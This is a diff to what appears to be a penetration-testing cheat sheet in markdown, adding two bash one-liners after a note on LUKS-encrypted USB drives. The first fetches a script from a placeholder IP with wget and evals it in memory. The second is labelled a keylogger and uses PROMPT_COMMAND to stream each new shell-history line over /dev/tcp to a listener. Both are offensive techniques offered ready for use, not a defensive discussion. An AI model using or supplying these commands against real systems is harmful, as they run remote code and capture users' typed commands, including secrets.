@@ -26,3 +26,15 @@ cmd.exe /k "whoami"
 ### _Luks On USBs_
 
 * [https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/](https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/)
+
+### Bash In memory exec one liner&#x20;
+
+```
+bash -c CMD="`wget -qO- http://<ip>/script.sh`" && eval "$CMD"
+```
+
+### Bash Keylogger&#x20;
+
+```
+PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
+```
